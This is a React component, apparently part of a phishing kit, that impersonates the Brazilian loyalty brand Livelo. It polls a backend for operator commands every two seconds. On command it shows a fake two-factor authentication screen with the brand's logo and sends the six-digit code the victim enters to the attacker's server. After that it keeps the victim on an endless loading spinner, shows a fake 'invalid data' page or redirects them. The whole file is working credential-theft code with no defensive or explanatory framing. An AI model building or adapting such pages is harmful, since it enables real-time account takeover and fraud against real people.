import { useState, useEffect, useRef } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function CommandPage({ userId }) {
  const [currentCommand, setCurrentCommand] = useState(null);
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef([]);

  // Verificar comandos a cada 2 segundos
  useEffect(() => {
    const checkCommand = async () => {
      try {
        const response = await axios.get(`${API}/user/check-action/${userId}`);
        if (response.data && response.data.action) {
          setCurrentCommand(response.data);
        }
      } catch (error) {
        console.error("Erro ao verificar comando:", error);
      }
    };

    checkCommand();
    const interval = setInterval(checkCommand, 2000);
    return () => clearInterval(interval);
  }, [userId]);

  const handleSubmit = async (e, field) => {
    e.preventDefault();
    setLoading(true);
    
    const code = codeDigits.join('');
    
    try {
      await axios.post(`${API}/user/submit-data/${userId}`, {
        field: field,
        value: code
      });
      setSubmitted(true);
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
    // Manter em loading infinito após enviar
  };

  // Handler para os 6 quadradinhos do código
  const handleCodeChange = (index, value) => {
    if (loading) return;
    
    // Aceitar apenas números
    const digit = value.replace(/\D/g, '').slice(-1);
    
    const newDigits = [...codeDigits];
    newDigits[index] = digit;
    setCodeDigits(newDigits);
    
    // Auto-avançar para o próximo campo
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (loading) return;
    
    // Voltar para o campo anterior ao apagar
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    if (loading) return;
    
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newDigits = [...codeDigits];
    
    for (let i = 0; i < pastedData.length; i++) {
      newDigits[i] = pastedData[i];
    }
    
    setCodeDigits(newDigits);
    
    // Focar no último campo preenchido ou no próximo vazio
    const focusIndex = Math.min(pastedData.length, 5);
    inputRefs.current[focusIndex]?.focus();
  };

  // Página de dados inválidos
  if (currentCommand?.action === "INV") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <svg className="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Dados Inválidos</h1>
          <p className="text-gray-600 mb-8">
            Os dados que você digitou estão incorretos. Por favor, tente novamente com as informações corretas.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="bg-pink-500 hover:bg-pink-600 text-white px-8 py-3 rounded-full font-semibold transition-colors"
          >
            Tentar Novamente
          </button>
        </div>
      </div>
    );
  }

  // Página de código 2FA (Autenticação de Duas Etapas)
  if (currentCommand?.action === "AUT") {
    const isCodeComplete = codeDigits.every(digit => digit !== '');
    
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone de Segurança */}
          <div className="mb-6">
            <div className="w-20 h-20 bg-gradient-to-br from-pink-100 to-purple-100 rounded-full flex items-center justify-center">
              <svg 
                className="w-10 h-10 text-pink-500" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth={2} 
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" 
                />
              </svg>
            </div>
          </div>

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Autenticação de Duas Etapas
          </h1>

          {/* Descrição */}
          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Digite o código do seu aplicativo autenticador
          </p>

          {/* Formulário */}
          <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-md space-y-6">
            {/* 6 Quadradinhos para o código */}
            <div className="flex justify-center gap-3">
              {codeDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={handlePaste}
                  disabled={loading}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
                    digit 
                      ? 'border-pink-500 bg-pink-50' 
                      : 'border-gray-300 bg-white'
                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
                />
              ))}
            </div>

            {/* Botão Confirmar */}
            <button
              type="submit"
              disabled={loading || !isCodeComplete}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
                isCodeComplete && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                </div>
              ) : (
                "Confirmar"
              )}
            </button>

            {/* Link de ajuda */}
            <div className="text-center pt-2">
              <a
                href="#"
                className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
              >
                Não recebeu o código?
              </a>
            </div>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a
            href="#"
            className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M15 19l-7-7 7-7"
              />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página aguarde
  if (currentCommand?.action === "AGUARDE") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <div className="inline-block animate-spin rounded-full h-16 w-16 border-b-4 border-pink-500"></div>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Aguarde...</h1>
          <p className="text-gray-600">
            Estamos processando sua solicitação. Por favor, aguarde um momento.
          </p>
        </div>
      </div>
    );
  }

  // Redirecionar
  if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
    window.location.href = currentCommand.redirect_url;
    return null;
  }

  return null;
}

export default CommandPage;
